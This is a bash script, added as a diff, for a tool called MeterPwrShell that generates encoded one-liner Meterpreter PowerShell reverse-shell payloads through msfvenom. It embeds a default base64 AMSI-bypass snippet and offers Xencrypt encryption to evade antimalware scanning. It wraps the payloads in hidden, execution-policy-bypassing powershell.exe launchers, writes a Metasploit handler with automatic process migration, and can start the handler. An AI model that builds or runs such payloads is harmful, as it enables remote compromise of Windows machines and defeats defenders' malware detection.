@@ -1,0 +1,596 @@
+#!/usr/bin/bash
+#PLEASE GOD SOMEONE HELP ME IM TIRED ALREADY !!!!
+#----------colors and configs----------
+okegreen='\033[92m' #goddamn it please dont fucking change it
+red='\e[1;31m' #goddamn it please dont fucking change it
+BlueF='\e[1;34m' #goddamn it please dont fucking change it
+COWSAYFILE=/usr/bin/cowsay #you can change this as you want
+COWSAYFILESOURCE=/usr/games/cowsay #you can change this as you want
+AMSIBYPASSCODEINBASE64="WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAJwAgACsAIAAnAFUAdABpAGwAcwAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGEAbQBzAGkAJwAgACsAIAAnAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAGEAbAB1AGUAKAAkAG4AdQBsAGwALAAkAHQAcgB1AGUAKQA=" #this is the default one....please dont change
+ATTACKERARCH=`dpkg --print-architecture` #goddamn it please dont fucking change it
+DETECTINTERNETCONNECTION=yes #not recommended to change it but you can change it to "no"
+DETECTATTACKERLINUXDISTRIBUTION=yes #not recommended to change it but you can change it to "no" 
+ENABLEROOTDETECTOR=yes #not recommended to change it but you can change it to "no"
+SESSIONID=$RANDOM
+#------------colors and configs----------
+#deleting old debug.log
+rm debug.log &> /dev/null
+#installing prequisite
+touch debug.log &> /dev/null
+#[-------------------------BEGIN debug.log ZONE-------------------------]
+#session id 
+echo "#SESSION ID NUMBER : $SESSIONID" &>> debug.log
+#root detector
+if [ $ENABLEROOTDETECTOR = yes ]; then
+    if [ $(id -u) -ne 0 ]; then
+      echo -e $red "Oopsie Doopsie You Are Not Root...lmao\nTry This You Goddamn Script Kiddie : \n'sudo ./meterpwrshell'\nNah Im Just Joking,Dont Be Mad :)"
+      exit 1
+    else
+        echo -e $red "[---] You're Root,Come On In Boii :) [---]"
+        read -t 2
+    fi
+fi
+#linux distribution detector
+if [ $DETECTATTACKERLINUXDISTRIBUTION = "yes" ]; then
+    ATTACKERLINUXDISTRIBUTION=`lsb_release -i | cut -f 2-`
+    if [ $ATTACKERLINUXDISTRIBUTION = "Kali" ]; then
+        echo "#linux distribution supported" &>> debug.log
+        echo -e $red "[---] Linux Distribution Supported [---]"
+        echo -e $red "Continuing..."
+        read -t 2
+        echo "#linux distribution = kali" &>> debug.log
+    elif [ $ATTACKERLINUXDISTRIBUTION = "Debian" ]; then
+        echo "#linux distribution supported" &>> debug.log
+        echo -e $red "[---] Linux Distribution Supported [---]"
+        echo -e $red "Continuing..."
+        read -t 2
+        echo "#linux distribution = debian" &>> debug.log
+    elif [ $ATTACKERLINUXDISTRIBUTION = "Ubuntu" ]; then
+        echo "#linux distribution supported" &>> debug.log
+        echo -e $red "[---] Linux Distribution Supported [---]"
+        echo -e $red "Continuing..."
+        read -t 2
+        echo "#linux distribution = ubuntu" &>> debug.log
+    else
+        echo -e $red "[!!!WARNING!!!] LINUX DISTRIBUTION UNSUPPORTED [!!!WARNING!!!]"
+        echo -e $red "[!!!WARNING!!!] THIS PROGRAM ONLY SUPPORT DEBIAN-BASED LINUX DISTRIBUTION [!!!WARNING!!!]"
+        echo -e $red "Exiting ..."
+        read -t 2
+        exit 1
+    fi
+fi
+#internet connection detector
+if [ $DETECTINTERNETCONNECTION = "yes" ]; then
+    wget -q --spider http://google.com
+    if [ $? -eq 0 ]; then
+        echo -e $red "[---] Internet Connection : Alive [---]"
+        echo -e $red "Continuing ..."
+        read -t 2
+        echo "#internet connection : alive" &>> debug.log
+    else
+        echo -e $red "[!!!] Internet Connection : Dead [!!!]"
+        echo -e $red "[!!!] THIS TOOL NEED INTERNET CONNECTION [!!!]"
+        echo -e $red "[!!!] IF YOU DONT WANT TO USE INTERNET,MODIFY THE SCRIPT AND SET DETECTINTERNETCONNECTION TO no [!!!]"
+        echo -e $red "Exiting ..."
+        read -t 2
+        exit 1
+    fi
+fi
+if [ $DETECTINTERNETCONNECTION = "no" ]; then
+    echo -e $red "[!!!WARNING!!!] THE PROGRAM MAYBE WILL BROKE IF YOU DONT HAVE INTERNET !!! [!!!WARNING!!!] "
+    while true; do
+        echo -ne $red "[!!!] DO YOU WANT TO CONTINUE ??? (yes/no) [!!!] : ";tput sgr0
+        read continuewithoutinternet
+        if [ "$continuewithoutinternet" = "yes" ]; then
+            echo -e $red "Okie Dokie Then :)"
+            echo -e $red "Continuing ..."
+            read -t 2
+            echo "#internet connection : unsure" &>> debug.log
+            break
+        fi
+        if [ "$continuewithoutinternet" = "no" ]; then
+            echo -e $red "Okie Dokie Then :)"
+            echo -e $red "Exiting ..."
+            read -t 2
+            exit 1
+        else
+            echo -e $red "[!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
+        fi
+    done
+fi
+#[-------------------------BEGIN debug.log ZONE-------------------------]
+echo -e $red "[---] Installing Prequisite...... [---] "
+echo "#installing wget,figlet,curl,gnupg,apt-transport-https,and cowsay with apt command" &>> debug.log
+apt-get install -y wget figlet cowsay curl gnupg apt-transport-https &>> debug.log
+if [ -f "$COWSAYFILE" ]; then
+    echo "cowsay executeable file exist" &>> debug.log
+else
+    echo "cowsay executeable file didnt exist...linking from /usr/share/games/cowsay to /usr/bin/cowsay" &>> debug.log
+    ln -s $COWSAYFILESOURCE $COWSAYFILE &>> debug.log
+fi
+while true; do
+    if [ -d "output/" ]; then
+        echo -ne $red "Have You Backed Up The Old output/ Directory Yet??? (yes/no) : "
+        read outputdirectorybackup
+        if [ "$outputdirectorybackup" = "no" ] ; then
+            echo -e $red " [!!!WARNING!!!] We Will Delete Old output/ Directory [!!!WARNING!!!]"
+            echo -e $red " [!!!WARNING!!!] Please Backup It Now !!! [!!!WARNING!!!]"
+            echo -e $red " Exiting ......"
+            cowsay -f dragon "Follow Me At https://github.com/GetRektBoy724 Or I Will Kill You!!!"
+            exit
+        fi
+        if [ "$outputdirectorybackup" = "yes" ] ; then
+            echo -e $red " Okie Dokie Than :)"
+            echo -e $red " Removing And Continuing ......"
+            echo "#removing old output/ directory" &>> debug.log
+            rm -rf output/ &>> debug.log
+            read -t 3
+            break
+        else
+            echo -e $red " [!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
+        fi
+    else
+        break
+    fi
+done
+clear
+echo -e $red " [------------------------------------------]"
+echo -e $red "[---] Installing And Adding The Prequisite...... [---]"
+echo -e $red "[---] !!!Make Sure You already Install Metasploit-Framework!!! [---]"
+echo -e $red "[---] Just Enter It Blank If You Want To Use Default Metasploit Framework Directory Path [---]" 
+echo -e $red "[---] Default Metasploit-Framework Directory Path : /usr/share/metasploit-framework [---]"
+echo -e $red "[---] Example : /path/to/metasploit-framework [---]"
+while true; do
+    echo -ne $red " YOUR METASPLOIT-FRAMEWORK DIRECTORY PATH WITHOUT SLASH ON THE BACKEND : ";tput sgr0
+    read msfpath
+    if [ -n "$msfpath" ]; then
+        if [ -f "$msfpath/msfvenom" ]; then
+            echo -e $red "[---] MSF Venom Exist In Your Path,Continuing ...... [---]"
+            read -t 2
+            break
+        else
+            echo -e $red "[!!!WARNING!!!] MSF Venom Doesnt Exist In Your Path,Please Make Sure You Have Typed It Correctly!!! [!!!WARNING!!!]"
+        fi
+    fi
+    if [ -z "$msfpath" ]; then
+        msfpath=/usr/share/metasploit-framework
+        if [ -f "$msfpath/msfvenom" ]; then
+            echo -e $red "[---] MSF Venom Exist In Your Path,Continuing ...... [---]"
+            read -t 2
+            break
+        else
+            echo -e $red "[!!!WARNING!!!] MSF Venom Doesnt Exist In Your Path,Please Make Sure You Have Typed It Correctly!!! [!!!WARNING!!!]"
+        fi
+    fi
+done
+if [ -f "$msfpath/modules/encoders/cmd/base64.rb" ]; then
+    echo "#base64 encoder exist,no need to re-download" &>> debug.log
+    echo -e $red "[---] Base64 Encoder Exist,No Need To Re-Download [---]"
+    read -t 2
+else
+    echo "#downloading base64 encoder with wget" &>> debug.log
+    wget https://raw.githubusercontent.com/pr0xy-8L4d3/powershell-base64-encoder/master/base64.rb &>> debug.log 
+    echo "#moving base64 encoder to metasploit framework directory" &>> debug.log
+    sudo mv base64.rb $msfpath/modules/encoders/cmd/ &>> debug.log
+fi
+echo "#making output/ directory" &>> debug.log
+mkdir output &>> debug.log
+clear
+#checking if the input is correct
+checkmeterpreterpayload ()
+{
+cat << !
+  Generate PowerShell Payload Input
+  +-------------------------++-------------------------++-----------------------+
+  | Name                    ||  Descript               || Your Input
+  +-------------------------++-------------------------++-----------------------+
+  | LHOST                   ||  The Listen Address     || $yourip
+  | LPORT                   ||  The Listen Ports       || $yourport
+  | PAYFILETYPE             ||  The Payload Type       || $msfpaytype
+  | ARCH                    ||  The Payload Arch       || $payarch
+  | BYPASS AMSI             ||  Bypass The AMSI        || $bypassamsi
+  | AMSI BYPASS TECHNIQUE   ||  AMSI Bypass Technique  || $amsibypasstechnique
+  +-------------------------++-------------------------++-----------------------+
+!
+}
+
+checkcustompayload ()
+{
+cat << !
+  Generate PowerShell Payload Input
+  +--------------------------------++--------------------------++-----------------------+
+  | Name                           ||  Descript                || Your Input
+  +--------------------------------++--------------------------++-----------------------+
+  | CUSTOM POWERSHELL PAYLOAD PATH ||  The Custom Payload Path || $custompayloadpath
+  | VICTIM ARCHITECTURE            ||  The Victim Architecture || $victimarch
+  | BYPASS AMSI                    ||  Bypass The AMSI         || $bypassamsi
+  +--------------------------------++--------------------------++-----------------------+
+!
+}
+
+bannerrandomizer ()
+{
+array[0]="iloveyoushell" #kiss
+array[1]="iseeanintruder" #eyes
+array[2]="waftdh" #tux (we are forced to do hackings)
+array[3]="normalfiglet" #figlet (MeterPwrShell)
+
+size=${#array[@]}
+index=$(($RANDOM % $size))
+banner=${array[$index]}
+}
+
+centerthebanner()
+{
+    columns="$(tput cols)"
+    while IFS= read -r line; do
+        printf "%*s\n" $(( (${#line} + columns) / 4)) "$line"
+    done < "$1"
+}
+
+showbanner ()
+{
+if [ "$banner" = "iloveyoushell" ]; then
+    cowsay -f kiss "I Love You,Shell" &>> banner.txt
+    centerthebanner "banner.txt"
+    rm banner.txt
+elif [ "$banner" = "iseeanintruder" ]; then
+    cowsay -f eyes "I See An Intruder !!!" &>> banner.txt
+    centerthebanner "banner.txt"
+    rm banner.txt
+elif [ "$banner" = "waftdh" ]; then
+    cowsay -f tux "We Are Forced To Do Hacking,Aren't We ??" &>> banner.txt
+    centerthebanner "banner.txt"
+    rm banner.txt
+elif [ "$banner" = "normalfiglet" ]; then
+    figlet "...MeterPwrShell..." &>> banner.txt
+    centerthebanner "banner.txt"
+    rm banner.txt
+fi
+}
+
+#menu/banner
+echo ""
+echo -e $okegreen " [---] MeterPwrshell - Meterpreter Powershell Payload With Base64 Encoded [---] "
+echo -e $okegreen "  [---Generate OneLiner Meterpreter Powershell Payload With Base64 Encoded---]  "
+bannerrandomizer
+showbanner
+echo -e $okegreen "                [---] Tool Programmed By GetRektBoy724 [---]                 "
+echo -e $okegreen "                [---]      Codename : ILoveShell       [---]                 "
+echo -e $okegreen "                [---]        Version : v3.0.0 (beta)   [---]                 "
+echo -e $okegreen "         [---] Follow Me At : https://github.com/GetRektBoy724 [---]         "
+echo -e $okegreen "                    [---] Session ID Number : $SESSIONID [---]                  "
+echo -e $okegreen " [-----------------------------------------------------------] "
+echo -e $okegreen "If You Want To Quit The Program...Just Press control-c!!"
+echo -e $okegreen "!!!Make Sure There Are No Typos!!!"
+echo -e $okegreen "Please Fill This Form First!!"
+setpayloadvariables ()
+{
+echo -e $BlueF "Enter It Blank If You Want To Use Default Option"
+while true; do
+    echo -ne $BlueF "Do You Want To Use Your Custom Powershell Payload ??? (Default = no) (yes/no) : ";tput sgr0
+    read custompayload
+    if [ -z "$custompayload" ]; then
+        custompayload=no
+        echo -e $BlueF "So You Dont Wanna Use Custom Payload ?? Alrighty Then :)"
+        echo -e $BlueF "[-----------------------------------------------------------] "
+    elif [ -n "$custompayload" ]; then
+        echo -e $BlueF "[-----------------------------------------------------------] "
+    fi
+    if [ "$custompayload" = "no" ]; then
+        echo -ne $BlueF "SET MSF PAYLOAD TYPE : ";tput sgr0
+        read msfpaytype
+        echo -e $BlueF " [--------------------] "
+        echo -ne $BlueF "SET LHOST : ";tput sgr0
+        read yourip
+        echo -e $BlueF " [--------------------] "
+        echo -ne $BlueF "SET LPORT : ";tput sgr0
+        read yourport
+        echo -e $BlueF " [--------------------] "
+        echo -ne $BlueF "YOUR PAYLOAD ARCHITECTURE : ";tput sgr0
+        read payarch
+        while true; do
+            echo -e $BlueF " [--------------------] "
+            echo -ne $BlueF "Do You Want To Bypass AMSI ??? (yes/no) : ";tput sgr0
+            read enablebypassamsi
+            if [ "$enablebypassamsi" = "yes" ]; then
+                bypassamsi=yes
+                echo -e $BlueF "You Can Read More About AMSI In Here : https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal"
+                read -t 1
+                echo -e $red "[!!!WARNING!!!] YOU NEED TO EXECUTE THE PAYLOAD ON POWERSHELL,NOT CMD.CAUSE CMD WILL TRUNCATE YOUR PAYLOAD!!! [!!!WARNING!!!]"
+                while true; do
+                    echo -ne $BlueF "Please Choose Between AMSI Bypass Code Technique Or Encryption Technique (amsibypasscode/encryption) : "; tput sgr0
+                    read chooseamsibypasstechnique
+                    if [ "$chooseamsibypasstechnique" = "amsibypasscode" ]; then
+                        amsibypasstechnique=amsibypasscode             
+                        echo -e $BlueF " [--------------------] "
+                        echo -e $BlueF "What Is Your Amsi Bypass Code ???"
+                        echo -e $BlueF "You Need To Encode The Code With Base64 UTF16LE !!!"
+                        echo -e $BlueF "Just Enter It Blank If You Want To Use Default AMSI Bypass Code"
+                        echo -ne $BlueF "Your Amsi Bypass Code In Base64 : "
+                        read customamsibypasscode
+                        if [ -z "$customamsibypasscode" ]; then
+                            echo -e $BlueF "Okie Dokie If You Want To Use Default AMSI Bypass Code"
+                            read -t 2
+                            break
+                        fi
+                        if [ -n "$customamsibypasscode" ]; then
+                            AMSIBYPASSCODEINBASE64="$customamsibypasscode"
+                            echo -e $BlueF "Okie Dokie Than,Registering AMSI Bypass Code Value..."
+                            read -t 2
+                            break
+                        fi
+                    fi
+                    if [ "$chooseamsibypasstechnique" = "encryption" ]; then
+                        amsibypasstechnique=encryption
+                        echo -e $BlueF "This Technique Is Powered By Xencrypt,You Can Check It Here : https://github.com/the-xentropy/xencrypt"
+                        read -t 3
+                        break
+                    else
+                        echo -e $red "[!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
+                    fi
+                done
+                break
+            fi
+            if [ "$enablebypassamsi" = "no" ]; then
+                bypassamsi=no
+                break
+            else
+                echo -e $red "[!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
+            fi
+        done
+        break
+    fi
+    if [ "$custompayload" = "yes" ]; then
+        echo -e $BlueF "[-----------------------------------------------------------] "
+        echo -e $BlueF "Example : /path/to/your/custom/payload/payload.ps1 "
+        echo -ne $BlueF "SET CUSTOM POWERSHELL PAYLOAD PATH : ";tput sgr0
+        read custompayloadpath
+        echo -e $BlueF " [--------------------] "
+        echo -ne $BlueF "YOUR VICTIM ARCHITECTURE : ";tput sgr0
+        read victimarch
+        while true; do
+            echo -e $BlueF " [--------------------] "
+            echo -ne $BlueF "Do You Want To Bypass AMSI ??? (yes/no) : ";tput sgr0
+            read enablebypassamsi
+            if [ "$enablebypassamsi" = "yes" ]; then
+                bypassamsi=yes
+                echo -e $red "[!!!WARNING!!!] YOU NEED TO EXECUTE THE PAYLOAD ON POWERSHELL,NOT CMD.CAUSE CMD WILL TRUNCATE YOUR PAYLOAD!!! [!!!WARNING!!!]"
+                while true; do
+                    echo -ne $BlueF "Please Choose Between AMSI Bypass Code Technique Or Encryption Technique (amsibypasscode/encryption) :"; tput sgr0
+                    read chooseamsibypasstechnique
+                    if [ "$chooseamsibypasstechnique" = "amsibypasscode" ]; then
+                        amsibypasstechnique=amsibypasscode             
+                        echo -e $BlueF " [--------------------] "
+                        echo -e $BlueF "What Is Your Amsi Bypass Code ???"
+                        echo -e $BlueF "You Need To Encode The Code With Base64 UTF16LE !!!"
+                        echo -e $BlueF "Just Enter It Blank If You Want To Use Default AMSI Bypass Code"
+                        echo -ne $BlueF "Your Amsi Bypass Code In Base64 : "
+                        read customamsibypasscode
+                        if [ -z "$customamsibypasscode" ]; then
+                            echo -e $BlueF "Okie Dokie If You Want To Use Default AMSI Bypass Code"
+                            read -t 2
+                            break
+                        fi
+                        if [ -n "$customamsibypasscode" ]; then
+                            AMSIBYPASSCODEINBASE64="$customamsibypasscode"
+                            echo -e $BlueF "Okie Dokie Than,Regitering AMSI Bypass Code Value..."
+                            read -t 2
+                            break
+                        fi
+                    fi
+                    if [ "$chooseamsibypasstechnique" = "encryption" ]; then
+                        amsibypasstechnique=encryption
+                        echo -e $BlueF "This Technique Is Powered By Xencrypt,You Can Check It Here : https://github.com/the-xentropy/xencrypt"
+                        read -t 3
+                        break
+                    else
+                        echo -e $red "[!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
+                    fi
+                done
+                break
+            fi
+            if [ "$enablebypassamsi" = "no" ]; then
+                bypassamsi=no
+                break
+            else
+                echo -e $red "[!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
+            fi
+        done
+        break
+    else
+        echo -e $red "[!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
+    fi
+done
+echo -e $BlueF "[-----------------------------------------------------------] "
+}
+setpayloadvariables
+if [ $custompayload = no ]; then
+    checkmeterpreterpayload
+else
+    checkcustompayload
+fi
+while true; do
+    echo -ne $BlueF "Are The Variables Correct ??? (yes/no) : "
+    read isthevariablescorrect
+    if [ "$isthevariablescorrect" = "no" ]; then
+        echo -e $BlueF "Resetting All Variables ..."
+        read -t 2
+        echo -e $BlueF "[-----------------------------------------------------------] "
+        setpayloadvariables
+        break
+    elif [ "$isthevariablescorrect" = yes ]; then
+        echo -e $BlueF "Continuing ..."
+        read -t 2
+        echo -e $BlueF "[-----------------------------------------------------------] "
+        break
+    fi
+done
+if [ $custompayload = no ]; then
+    echo "#variableoptions" &>> debug.log
+    echo "your metasploit framework path : $msfpath" &>> debug.log
+    echo "msfpayload : $msfpaytype" &>> debug.log
+    echo "lhost/yourip : $yourip" &>> debug.log
+    echo "lport/yourpurt : $yourport" &>> debug.log
+    echo "payloadarchitecture : $payarch" &>> debug.log
+    echo "bypass AMSI : $bypassamsi" &>> debug.log
+    if [ $bypassamsi = yes ]; then
+        echo "AMSI bypass technique : $amsibypasstechnique" &>> debug.log
+        if [ $amsibypasstechnique = amsibypasscode ]; then
+            echo "AMSI bypass code : $AMSIBYPASSCODEINBASE64" &>> debug.log
+        fi
+    fi
+fi
+if [ $custompayload = yes ]; then
+    echo "#variableoptions" &>> debug.log
+    echo "your custom payload path : $custompayloadpath" &>> debug.log
+    echo "your victim architecture : $victimarch" &>> debug.log
+    echo "bypass AMSI : $bypassamsi" &>> debug.log
+    if [ $bypassamsi = yes ]; then
+        echo "AMSI bypass technique : $amsibypasstechnique" &>> debug.log
+        if [ $amsibypasstechnique = amsibypasscode ]; then
+            echo "AMSI bypass code : $AMSIBYPASSCODEINBASE64" &>> debug.log
+        fi
+    fi
+fi
+echo -e $BlueF "Please Wait....This Gonna Take A Few Minutes.......Take A Cup Of Coffe Or Snack Maybe :)"
+#makingpayloadprocess
+if [ $custompayload = no ]; then
+    if [ $bypassamsi = no ]; then
+        echo "#making meterpreter powershell payload" &>> debug.log
+        msfvenom -p $msfpaytype LHOST=$yourip LPORT=$yourport --smallest -f psh -o 1.ps1 &>> debug.log
+        echo "#encoding meterpreter powershell payload with base64 encoder" &>> debug.log
+        cat 1.ps1 | msfvenom -e cmd/base64 -a $payarch --platform windows NOEXIT -o meterpwrshell.output.$payarch.$SESSIONID.txt &>> debug.log
+        echo -e "use exploit/multi/handler\nset payload $msfpaytype\nset lhost $yourip\nset lport $yourport\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo true\nset AutoLoadStdapi true\nset InitialAutoRunScript 'post/windows/manage/migrate'\nexploit -j" >> meterpwrshell.handler.$payarch.$SESSIONID.rc
+        mv meterpwrshell.handler.$payarch.$SESSIONID.rc output/
+        echo "#moving base64 encoded meterpreter powershell payload to output/" &>> debug.log
+        mv meterpwrshell.output.$payarch.$SESSIONID.txt output/ &>> debug.log
+        echo "#deleting non-encoded meterpreter powershell payload" &>> debug.log
+        rm 1.ps1 &>> debug.log
+    fi
+    if [ $bypassamsi = yes ]; then
+        if [ $amsibypasstechnique = amsibypasscode ]; then
+            echo "#making meterpreter powershell payload" &>> debug.log
+            msfvenom -p $msfpaytype LHOST=$yourip LPORT=$yourport --smallest -f psh -o 1.ps1 &>> debug.log
+            echo "#creating amsi bypass code" &>> debug.log
+            echo "powershell.exe -W Hidden -nop -ep bypass -NoExit -E $AMSIBYPASSCODEINBASE64;" >> dontremove.txt
+            echo "#encoding your custom powershell payload with base64 encoder" &>> debug.log
+            cat 1.ps1 | iconv -f UTF8 -t UTF16LE | base64 >> dontremove.txt
+            cat dontremove.txt | tr -d '\n' &>> meterpwrshell.output.$payarch.$SESSIONID.txt
+            echo -e "use exploit/multi/handler\nset payload $msfpaytype\nset lhost $yourip\nset lport $yourport\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo true\nset AutoLoadStdapi true\nset InitialAutoRunScript 'post/windows/manage/migrate'\nexploit -j" >> meterpwrshell.handler.$payarch.$SESSIONID.rc
+            mv meterpwrshell.handler.$payarch.$SESSIONID.rc output/
+            echo "#moving base64 encoded meterpreter powershell payload to output/" &>> debug.log
+            mv meterpwrshell.output.$payarch.$SESSIONID.txt output/ &>> debug.log
+            echo "#deleting non-encoded meterpreter powershell payload" &>> debug.log
+            rm 1.ps1 &>> debug.log
+            rm dontremove.txt &>> debug.log
+        fi
+        if [ $amsibypasstechnique = encryption ]; then
+            echo "#installing powershell" &>> debug.log
+            apt-get install powershell  &>> debug.log
+            if [ $? != 0 ]; then
+                echo "#powershell installation failed,caused by powershell is not available on the repository...adding microsoft repository and installing powershell again" &>> debug.log
+                curl https://packages.microsoft.com/keys/microsoft.asc | apt-key add - &>> debug.log
+                echo "deb [arch=$ATTACKERARCH] https://packages.microsoft.com/repos/microsoft-debian-stretch-prod stretch main" &>> /etc/apt/sources.list
+                apt update &>> debug.log
+                apt-get install powershell &>> debug.log
+            fi
+            echo "#downloading xencrypt to encrypt the payload" &>> debug.log
+            wget https://raw.githubusercontent.com/the-xentropy/xencrypt/master/xencrypt.ps1 &>> debug.log
+            echo "#making meterpreter powershell payload" &>> debug.log
+            msfvenom -p $msfpaytype LHOST=$yourip LPORT=$yourport --smallest -f psh -o 1.ps1 &>> debug.log
+            echo "#encrypting meterpreter powershell payload with xencrypt" &>> debug.log
+            pwsh -c "Import-Module ./xencrypt.ps1; Invoke-Xencrypt -InFile 1.ps1 -OutFile 1xencrypted.ps1" &>> debug.log
+            echo "#encoding meterpreter powershell payload with base64 encoder" &>> debug.log
+            echo "powershell.exe -W Hidden -nop -ep bypass -NoExit -E " >> dontremove.txt
+            cat 1xencrypted.ps1 | iconv -f UTF8 -t UTF16LE | base64 >> dontremove.txt
+            cat dontremove.txt | tr -d '\n' &>> meterpwrshell.output.$payarch.$SESSIONID.txt
+            echo -e "use exploit/multi/handler\nset payload $msfpaytype\nset lhost $yourip\nset lport $yourport\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo true\nset AutoLoadStdapi true\nset InitialAutoRunScript 'post/windows/manage/migrate'\nexploit -j" >> meterpwrshell.handler.$payarch.$SESSIONID.rc
+            mv meterpwrshell.handler.$payarch.$SESSIONID.rc output/
+            echo "#moving base64 encoded meterpreter powershell payload to output/" &>> debug.log
+            mv meterpwrshell.output.$payarch.$SESSIONID.txt output/ &>> debug.log
+            echo "#deleting non-needed files" &>> debug.log
+            rm 1.ps1 &>> debug.log
+            rm 1xencrypted.ps1 &>> debug.log
+            rm dontremove.txt &>> debug.log
+            rm xencrypt.ps1 &>> debug.log
+        fi
+    fi
+fi
+if [ $custompayload = yes ]; then 
+    if [ $bypassamsi = no ]; then
+        echo "#encoding your custom powershell payload with base64 encoder" &>> debug.log
+        cat $custompayloadpath | msfvenom -e cmd/base64 -a $victimarch --platform windows NOEXIT A -o meterpwrshell.output.$victimarch.$SESSIONID.txt &>> debug.log
+        echo "#moving base64 encoded custom powershell payload to output/" &>> debug.log
+        mv meterpwrshell.output.$victimarch.txt output/ &>> debug.log
+    fi
+    if [ $bypassamsi = yes ]; then
+        if [ $amsibypasstechnique = amsibypasscode ]; then
+            echo "#creating amsi bypass code" &>> debug.log
+            echo "powershell.exe -W Hidden -nop -ep bypass -NoExit -E $AMSIBYPASSCODEINBASE64;" >> dontremove.txt
+            echo "#encoding your custom powershell payload with base64 encoder" &>> debug.log
+            cat $custompayloadpath | iconv -f UTF8 -t UTF16LE | base64 >> dontremove.txt
+            cat dontremove.txt | tr -d '\n' &>> meterpwrshell.output.$victimarch.$SESSIONID.txt
+            mv meterpreter.output.$victimarch.txt output/
+            rm dontremove.txt
+        fi
+        if [ $amsibypasstechnique = encryption ]; then
+            echo "#installing powershell" &>> debug.log
+            apt-get install powershell  &>> debug.log
+            if [ $? != 0 ]; then
+                echo "#powershell installation failed,caused by powershell is not available on the repository...adding microsoft repository and installing powershell again" &>> debug.log
+                curl https://packages.microsoft.com/keys/microsoft.asc | apt-key add - &>> debug.log
+                echo "deb [arch=$ATTACKERARCH] https://packages.microsoft.com/repos/microsoft-debian-stretch-prod stretch main" &>> /etc/apt/sources.list
+                apt update &>> debug.log
+                apt-get install powershell &>> debug.log
+            fi
+            echo "#downloading xencrypt to encrypt the payload" &>> debug.log
+            wget https://raw.githubusercontent.com/the-xentropy/xencrypt/master/xencrypt.ps1 &>> debug.log
+            echo "#encrypting your custom powershell payload with xencrypt" &>> debug.log
+            pwsh -c "Import-Module ./xencrypt.ps1; Invoke-Xencrypt -InFile $custompayloadpath -OutFile 1xencrypted.ps1" &>> debug.log
+            cat 1xencrypted.ps1 | iconv -f UTF8 -t UTF16LE | base64 >> dontremove.txt
+            cat dontremove.txt | tr -d '\n' &>> meterpwrshell.output.$victimarch.$SESSIONID.txt
+            rm dontremove.txt &>> debug.log
+            rm 1xencrypted.ps1 &>> debug.log
+            rm xencrypt.ps1 &>> debug.log
+        fi
+    fi
+fi
+#[--------------------------END debug.log ZONE--------------------------]
+echo -e $okegreen "[-----------------------------------------------------------] "
+echo -e $okegreen "[---] The One-Liner Meterpreter/Custom Powershell Payload Has Been Maked By MeterPwrShell [---]"
+if [ $custompayload = no ]; then
+    echo -e $okegreen "[---] The Output File Is On The : output/meterpwrshell.output.$payarch.$SESSIONID.txt [---]"
+else
+    echo -e $okegreen "[---] The Output File Is On The : output/meterpwrshell.output.$victimarch.$SESSIONID.txt [---]"
+fi
+if [ $custompayload = no ]; then
+    echo -e $okegreen "[---] The Handler File Is On The : output/meterpwrshell.handler.$payarch.$SESSIONID.rc [---]"
+fi
+echo -e $okegreen "[---] The Debug File Is On The : debug.log [---]"
+while true; do
+    if [ $custompayload = no ]; then
+        echo -ne $okegreen "[---] Do You Want To Start The Metasploit Handler ??? [---] (yes/no) : ";tput sgr0
+        read startmsfhandler
+        if [ "$startmsfhandler" = "yes" ]; then
+            echo -e $okegreen "[---] Launching,Please Wait ...... [---]"
+            msfconsole -r output/meterpwrshell.handler.$payarch.rc
+            cowsay -f dragon "Follow Me At https://github.com/GetRektBoy724 Or I Will Kill You!!!"
+            echo -e $okegreen "This Tool Is Not Completely Bugless"
+            echo -e $okegreen "If You Find A Bug...Please Report It At https://github.com/GetRektboy724/MeterPwrShell/issues"
+            break
+        fi
+        if [ "$startmsfhandler" = "no" ]; then
+            cowsay -f dragon "Follow Me At https://github.com/GetRektBoy724 Or I Will Kill You!!!"
+            echo -e $okegreen "This Tool Is Not Completely Bugless"
+            echo -e $okegreen "If You Find A Bug...Please Report It At https://github.com/GetRektboy724/MeterPwrShell/issues"
+            exit
+        else
+            echo -e $red "[!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
+        fi
+    else
+        cowsay -f dragon "Follow Me At https://github.com/GetRektBoy724 Or I Will Kill You!!!"
+        echo -e $okegreen "This Tool Is Not Completely Bugless"
+        echo -e $okegreen "If You Find A Bug...Please Report It At https://github.com/GetRektboy724/MeterPwrShell/issues" 
+    fi
+done
